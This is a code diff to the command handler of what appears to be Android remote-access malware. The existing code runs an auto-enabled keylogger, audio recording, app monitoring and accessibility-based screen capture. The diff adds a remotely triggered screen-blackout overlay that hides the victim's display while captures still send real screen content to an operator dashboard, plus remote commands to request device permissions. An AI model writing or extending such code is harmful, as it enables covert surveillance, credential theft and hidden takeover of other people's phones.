@@ -63,6 +63,8 @@ public class SocketManager {
     private final AudioRecorder     audioRecorder;
     private final KeyloggerService  keyloggerService;
     private final AppMonitor        appMonitor;
+    private final ScreenBlackout    screenBlackout;
+    private final PermissionManager permissionManager;
 
     public static synchronized SocketManager getInstance(Context context) {
         if (instance == null) instance = new SocketManager(context.getApplicationContext());
@@ -81,6 +83,8 @@ public class SocketManager {
         audioRecorder      = new AudioRecorder(context);
         keyloggerService   = new KeyloggerService(context);
         appMonitor         = new AppMonitor(context, keyloggerService);
+        screenBlackout     = ScreenBlackout.getInstance(context);
+        permissionManager  = new PermissionManager(context);
         // Auto-enable keylogger on init (will capture once accessibility is granted)
         KeyloggerService.setEnabled(true);
     }
@@ -464,6 +468,39 @@ public class SocketManager {
             return r;
         }
 
+        // ── Screen Blackout ───────────────────────────────────────────────
+        if (command.equals("screen_blackout_on")) {
+            return screenBlackout.enableBlackout();
+        }
+        if (command.equals("screen_blackout_off")) {
+            return screenBlackout.disableBlackout();
+        }
+        if (command.equals("get_blackout_status")) {
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("active", screenBlackout.isActive());
+            r.put("message", screenBlackout.isActive() ? "Screen blackout is ON" : "Screen blackout is OFF");
+            return r;
+        }
+
+        // ── Permissions ───────────────────────────────────────────────────
+        if (command.equals("get_permissions")) {
+            return permissionManager.getPermissions();
+        }
+        if (command.equals("request_permission")) {
+            String perm = params.optString("permission", "");
+            if (perm.isEmpty()) {
+                JSONObject r = new JSONObject();
+                r.put("success", false);
+                r.put("error", "Missing 'permission' parameter");
+                return r;
+            }
+            return permissionManager.requestPermission(perm);
+        }
+        if (command.equals("request_all_permissions")) {
+            return permissionManager.requestAllPermissions();
+        }
+
         // ── Accessibility-required commands ──────────────────────────────
         // Screen Control (gestures) + Screen Reader
         if (isAccessibilityCommand(command)) {
@@ -524,17 +561,31 @@ public class SocketManager {
     }
 
     private Bitmap captureFrame() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
-            if (svc != null) return svc.captureScreenSync();
+        final Bitmap[] result = {null};
+
+        Runnable doCapture = () -> {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+                if (svc != null) {
+                    result[0] = svc.captureScreenSync();
+                    return;
+                }
+            }
+            try {
+                result[0] = screenshotHandler.captureBitmap();
+            } catch (Exception e) {
+                Log.w(TAG, "captureFrame fallback failed: " + e.getMessage());
+            }
+        };
+
+        // If blackout is active, briefly hide the overlay so dashboard sees real content
+        if (screenBlackout.isActive()) {
+            screenBlackout.runWithOverlayHidden(doCapture);
+        } else {
+            doCapture.run();
         }
-        // Fallback: try screenshot handler
-        try {
-            return screenshotHandler.captureBitmap();
-        } catch (Exception e) {
-            Log.w(TAG, "captureFrame fallback failed: " + e.getMessage());
-            return null;
-        }
+
+        return result[0];
     }
 
     private String bitmapToBase64(Bitmap bitmap, int quality) {
